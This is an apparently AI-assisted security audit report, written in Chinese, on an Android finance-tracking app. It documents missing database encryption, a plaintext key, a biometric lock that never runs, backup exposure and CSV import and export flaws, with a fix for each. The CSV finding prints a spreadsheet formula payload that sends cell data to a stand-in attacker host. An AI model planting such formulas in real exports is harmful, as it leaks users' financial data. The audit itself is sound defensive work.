## 执行摘要（结论先行，大白话）

**FinanceTracker 是一个"宣称有安全保护、实际零安全保护"的 Android 记账 App。**

README 第 13 行和设置页 UI 都写明"🔒 安全保护 - 生物识别认证 + SQLCipher 数据库加密"，但深度追数据流后确认：

1. **SQLCipher 根本没接进数据库**——`DatabaseEncryption.getPassphrase()` 这套加密代码是"死代码"，全仓 grep 只有它自己的类和 DI 容器引用它，`DatabaseModule` 建 Room 时压根没传 `openHelper`/`SupportFactory`。实际数据库是**明文 SQLite**，所有交易、账户余额、预算等财务 PII 裸存在磁盘上。
2. **生物识别从未被调用**——`BiometricAuthenticator.authenticate()` 全仓除了自身定义处之外**零调用**。设置页的"生物识别解锁"开关只写一个布尔偏好，开关本身连指纹都不验证一下，开了也没有任何启动门拦截。
3. **就算把 SQLCipher 接上，密钥也是明文存在 SharedPreferences**，而且用的是非密码学随机数生成；叠加 `allowBackup=true`，`adb backup` 一把把"加密的库 + 明文密钥"全导走，加密形同虚设。

一句话：**用户以为记账数据上了锁，其实门是开着的，锁还是坏的，钥匙就挂在门上。** 这是本审计最高优先级问题，且属于跨模块结构性问题，不是改 1-2 行能修的。

findings 总数：15（H 5 / M 4 / L 4 / I 2；其中 H-001、H-005 兼为 structural，已镜像入 SD）。结构性债务 2 条已入 `.claude/structural-debt.md`（SD-004、SD-005），不本轮派 fix；可派生 fix 8 条入 `audit-cycle-state.json` 的 `derived_fixes`（pending）。

## Findings

### H-001 — SQLCipher 死代码：数据库从未加密（CRITICAL）
- **file**: `core/data/src/main/java/com/financetracker/core/data/di/DatabaseModule.kt:24-37`
- **severity**: high
- **kind**: structural
- **finding**: `provideDatabase()` 用 `Room.databaseBuilder(...).build()` 构建数据库，**没有** `.openHelperFactory(...)` 或 `SupportFactory` 把 SQLCipher 接进去。`DatabaseEncryption.getPassphrase()` 的注释（`DatabaseEncryption.kt:17-18`）写"The actual SupportFactory creation is done at the database builder level"——但 builder 那一层根本没有这一步。全仓 grep `getPassphrase|openHelper|SupportFactory|SQLCipher` 在 `core/data` 模块零命中。结果：Room 实际打开的是明文 SQLite 文件，README/feature 列表/UI 副标题宣称的"SQLCipher 数据库加密"完全不成立。所有财务数据（账户余额、交易明细、预算、分类）以明文落盘。
- **数据流**: 用户记账 → TransactionRepository → Room DAO → 明文 SQLite 文件（`/data/data/com.financetracker/databases/finance.db`）→ 无任何加密层。
- **remediation**: 在 `DatabaseModule` 注入 `DatabaseEncryption`，用 `SQLiteDatabase.loadLibs()` + `SupportFactory(ByteArray)`（或 `sqlcipher-android` 的 `Factory`）接进 `Room.databaseBuilder().openHelperFactory(...)`。**注意**：当前已有明文 DB 存在（用户已记账），不能直接切加密——需迁移：用明文 key 打开旧库 → `ATTACH DATABASE 'finance-enc.db' AS enc KEY '...'` → 逐表导出 → 切到加密库。属结构性改动（跨 core/data + core/security + 迁移测试），入 SD-004。

### H-002 — SQLCipher 口令明文存 SharedPreferences（即使接上也白搭）
- **file**: `core/security/src/main/java/com/financetracker/core/security/crypto/DatabaseEncryption.kt:28-36`
- **severity**: high
- **kind**: route-fix
- **finding**: `getOrCreatePassphrase()` 把数据库加密口令以**明文 String** 写进 `SharedPreferences("security_prefs", MODE_PRIVATE)`。`MODE_PRIVATE` 只是"别的 app 进程读不了"，文件本身是明文 XML：root 设备、`adb backup`（见 H-004 `allowBackup=true`）、取证工具可直接 `cat` 出口令。口令一旦泄露，SQLCipher 形同虚设。
- **remediation**: 用 Android Keystore——方案 A：Keystore 生成 256-bit AES key（`setUserAuthenticationRequired` 可绑生物识别），用其加解密一个随机 DB 口令，密文存 prefs；方案 B：直接 `EncryptedSharedPreferences`（内部走 Keystore）。禁止明文存口令。

### H-003 — 口令用非密码学 PRNG 生成
- **file**: `core/security/src/main/java/com/financetracker/core/security/crypto/DatabaseEncryption.kt:38-41`
- **severity**: high
- **kind**: route-fix
- **finding**: `generateSecurePassphrase()` 用 `chars.random()`，即 `kotlin.random.Random`（非密码学 PRNG，可预测/可被种子推断）。32 字符口令若来自非 CSPRNG，等价于密钥强度远低于名义值。SQLCipher 口令必须用 CSPRNG。
- **remediation**: 改 `java.security.SecureRandom`（`SecureRandom.nextBytes` 后 base64，或直接 `SecureRandom` 驱动字符选取）。可与 H-002 合并为一处 fix（同文件）。

### H-004 — `android:allowBackup="true"` 一把导走库 + 密钥
- **file**: `app/src/main/AndroidManifest.xml:6`
- **severity**: high
- **kind**: route-fix
- **finding**: `android:allowBackup="true"`。叠加 H-001（明文库）+ H-002（明文口令 in security_prefs），`adb backup` 或 Auto Backup 能一次性把"明文数据库 + 明文加密口令"全导出到 PC，绕过任何运行时门。对一个**财务 App**，这是不可接受的数据外泄面。
- **remediation**: 财务类应用应 `android:allowBackup="false"`；若要保留部分备份，加 `android:dataExtractionRules` 明确**排除** `databases/` 与 `shared_prefs/security_prefs.xml`，`fullBackupContent` 同理。

### H-005 — 生物识别从未生效：开关只写布尔、启动无门、`authenticate()` 零调用
- **file**: `feature/settings/.../SettingsViewModel.kt:36-42`、`app/src/main/java/.../MainActivity.kt:16-27`、`core/security/.../biometric/BiometricAuthenticator.kt:23-63`
- **severity**: high
- **kind**: structural
- **finding**: 三层都断：
  1. `SettingsViewModel.toggleBiometric(enabled)` 只调 `canAuthenticate()`（**能力查询**，不验证身份），通过就直接 `settingsRepo.setBiometricEnabled(enabled)` 写布尔。开启生物识别这一动作本身**不要求用户先过一次指纹**——拿到设备的任何人都能把开关打开或关掉。
  2. 全仓 grep `BiometricAuthenticator.authenticate(`：除 `BiometricAuthenticator.kt:62` 自身调用 `biometricPrompt.authenticate(promptInfo)` 外，**无任何调用方**。即 `authenticate()` 方法在整个 app 里没人调。
  3. `MainActivity.onCreate` 直接 `setContent { ... AppNavigation() }`，**没有**任何启动鉴权屏；`biometricEnabled` 这个偏好也没被 `AppNavigation` 消费去拦截入口。
  - 结论：README/UI"使用指纹或面部识别保护应用"是**虚假宣传**，生物识别层完全不工作。
- **remediation**: 结构性——需新建 `feature/auth` 启动鉴权屏（Compose `AuthScreen` + `AuthViewModel`），`AppNavigation` 在根路由加 `biometricEnabled` 守卫（开关开 → 启动必过 `BiometricAuthenticator.authenticate` 才进主界面）；`toggleBiometric(true)` 时先强制过一次 `authenticate()` 验证再落布尔。跨 feature/app 模块，入 SD-005。

### M-001 — 生物识别只走 negative-button、无设备凭证兜底、不绑 CryptoObject
- **file**: `core/security/src/main/java/.../biometric/BiometricAuthenticator.kt:55-59`
- **severity**: medium
- **kind**: route-fix
- **finding**: `PromptInfo` 用 `setNegativeButtonText("取消")`，这与 `setAllowedAuthenticators(...DEVICE_CREDENTIAL)` 互斥——指纹多次失败或设备无生物识别时**无 PIN/图案兜底**，用户可能被锁在主流程外。且 `authenticate(promptInfo)` 未传 `CryptoObject`，无法与 Keystore 密钥绑定（若 H-002 改成 Keystore 绑生物识别，这里要同步改）。`canAuthenticate` 只查 `BIOMETRIC_STRONG`。
- **remediation**: 提供 `BIOMETRIC_STRONG | DEVICE_CREDENTIAL` 组合（去掉 negativeButtonText，改用 `setConfirmationRequired(false)`），并预留 `CryptoObject` 重载以便 H-002 落地后绑定密钥。

### M-002 — CSV 导出无公式注入防护
- **file**: `feature/import-export/src/main/java/.../CsvService.kt:30-32`
- **severity**: medium
- **kind**: route-fix
- **finding**: `CsvExporter.exportToCsv` 把 `title`/`note` 原样（仅 `"`→`""` 转义）塞进 `"..."` 单元格。用户备注若以 `=`、`+`、`-`、`@`、`\t`、`\r` 开头（用户随手记 "=补贴"、"@人" 完全可能），导出的 CSV 在 Excel/WPS 打开会被当作公式执行——`WEBSERVICE("http://attacker/?x="&A1)`、`=HYPERLINK(...)` 可外泄账目数据。**无任何前缀中和**（不加 `'` 也不剥危险首字符）。
- **remediation**: 导出时对以 `=+-@\t\r` 开头的字段值前置 `'`（或 tab），中和公式语义；或对数字/公式敏感字段做白名单。可与 M-003 合并。

### M-003 — CSV 导入：全量 `readLines()` OOM + `""` 转义解析错误（往返损坏）
- **file**: `feature/import-export/src/main/java/.../CsvService.kt:49`、`88-101`
- **severity**: medium
- **kind**: route-fix
- **finding**: 
  1. `reader.readLines()` 一次性把整个文件读进内存，无大小上限/流式——用户导入大备份或恶意大文件即 OOM 崩溃。
  2. `parseCsvLine` 对 `"` 的处理是**每个 `"` 翻转一次 inQuotes**，不区分"转义的 `""`"与"字段的起止引号"。导出器（行 30-31）把 `"` 写成 `""` 转义，但导入器遇到 `a""b`（应为字面 `a"b`）会翻转两次当成"出引号再进引号"→ 解析错位，**导出再导入往返损坏**。含 `"` 的备注/标题会被错切列或吞字符。
- **remediation**: 改流式（逐行 `readLine()` 或 `BufferedReader.useLines`，加行数上限）；解析器重写为标准 RFC 4180 状态机（遇 `""` 在引号内视为字面 `"`，不翻转 inQuotes）。可与 M-002 合并（同文件 CsvService.kt）。

### M-004 — `fallbackToDestructiveMigration()` 在每次 `version==1` 时启用（更新即丢数据）
- **file**: `core/data/src/main/java/.../di/DatabaseModule.kt:33-35`
- **severity**: medium
- **kind**: route-fix
- **finding**: 守卫条件是 `if (DATABASE_VERSION == 1) fallbackToDestructiveMigration()`。当前 version 就是 1，意味着**现在任何 schema 变动（哪怕只加一列）都会触发破坏性迁移**——旧库被直接 drop，全部交易/预算历史静默清空。注释（行 30-31）写"only use destructive migration in debug builds"，但实际条件是 `== 1` 而非 `BuildConfig.DEBUG`，release 一样丢。对一个存财务历史的应用这是数据丢失面。
- **remediation**: 守卫改为 `if (BuildConfig.DEBUG) fallbackToDestructiveMigration()`（或仅 `fallbackToDestructiveMigrationOnDowngrade`）；version>1 必须提供真实 `Migration` 对象。注意与 H-001（接 SQLCipher 时的迁移）耦合——若 SD-004 落地加密迁移，本条一并处理。

### L-001 — Logger 无 BuildConfig 守卫、无 PII 脱敏
- **file**: `core/common/src/main/java/.../util/Logger.kt:1-30`
- **severity**: low
- **kind**: route-fix
- **finding**: `Logger` 对 `Log.d/i/w/e/v` 的包装**无条件**输出，无 `if (BuildConfig.DEBUG)` 守卫、无字段脱敏。若任一调用方把金额、备注、账户名传进 `Logger.*`，PII 即进 logcat（adb / bug report 可读，其他 app 在旧 API 也可读）。当前调用面待查，但 wrapper 层无防护本身是隐患。
- **remediation**: 加 `if (BuildConfig.DEBUG)` 守卫（release 静默）；对金额/备注类参数做长度截断 + 标记 `[redacted]`；或直接 release 接 no-op。

### L-002 — `getPassphrase()` 吞异常返回 null（安全路径静默失败）
- **file**: `core/security/src/main/java/.../crypto/DatabaseEncryption.kt:20-26`
- **severity**: low
- **kind**: route-fix
- **finding**: `getPassphrase()` 的 `catch (e: Exception)` 把所有异常吞掉返回 `null`。若 Keystore/SharedPreferences 读写失败（权限、磁盘、加密失败），调用方拿到 `null` 口令——要么 crash 要么 SQLCipher 拿空口令开库（行为未定义，可能开成空库）。安全关键路径**禁止静默**。
- **remediation**: 抛出具体异常或返回 `sealed result`，让上层决定 fail-closed（拒开库）而非 fail-open。

### L-003 — CSV 导入信任文件内 accountId/categoryId、兜底 `?: 1L` 错挂账
- **file**: `feature/import-export/src/main/java/.../CsvService.kt:55-68`
- **severity**: low
- **kind**: route-fix
- **finding**: 导入直接用 CSV 里的 `fields[3]`(accountId)、`fields[4]`(categoryId) 写入交易，**不校验该账户/分类是否存在或属于当前用户**；若字段空则 `defaultAccountId = accounts.firstOrNull()?.id ?: 1L`——硬编码兜底 `1L`，可能把一笔外部导入的交易错挂到 id=1 的账户上（数据完整性问题，非多用户场景下非安全，但易混淆账目）。
- **remediation**: 导入前对 accountId/categoryId 做存在性校验（查 DAO），不存在则计入 `failedCount` 并附原因；去掉硬编码 `1L` 兜底，无账户时整体拒绝导入。

### L-004 — pre-Q 导出分支缺 `WRITE_EXTERNAL_STORAGE` 权限（API 26-28 崩溃）
- **file**: `feature/import-export/src/main/java/.../ImportExportViewModel.kt:35-39`
- **severity**: low
- **kind**: route-fix
- **finding**: `minSdk=26`，`saveToFile` 在 `SDK < Q(29)` 走 legacy 分支 `File(...).writeText(content)` 写公共 Downloads 目录——该分支需要 `WRITE_EXTERNAL_STORAGE` 权限，但 `AndroidManifest.xml` 未声明。API 26-28 设备导出会运行时 `SecurityException` 崩溃（Q+ 走 MediaStore 安全）。属死分支 bug。
- **remediation**: 要么 minSdk 提到 29（Q+ 全走 MediaStore）删 legacy 分支；要么 manifest 补 `WRITE_EXTERNAL_STORAGE` + 运行时申请（不推荐，财务应用应少权限）。建议前者。

### I-001 — release 构建未配签名 + 未 `isShrinkResources`
- **file**: `app/build.gradle.kts:21-25`
- **severity**: info
- **kind**: route-fix
- **finding**: `release { isMinifyEnabled = true; proguardFiles(...) }` 但**无 `signingConfig`**——release APK 产出未签名，无法直接上架 Play；也无 `isShrinkResources = true`（资源未收缩，APK 偏大）。非安全漏洞，工程化缺口。
- **remediation**: 配 release keystore（CI 注入，不入仓）；加 `isShrinkResources = true`。

### I-002 — Room `exportSchema = false`（缺迁移审计依据）
- **file**: `core/data/src/main/java/.../db/FinanceDatabase.kt:24`
- **severity**: info
- **kind**: route-fix
- **finding**: `@Database(..., exportSchema = false)`——不导出 schema JSON，后续版本无法用 Room 的 `MigrationTestHelper` 自动校验迁移正确性。与 M-004（破坏性迁移）叠加，迁移路径无任何测试网。
- **remediation**: 设 `exportSchema = true`，schema JSON 入仓（`schemas/` 目录），配 `MigrationTestHelper` 测试。
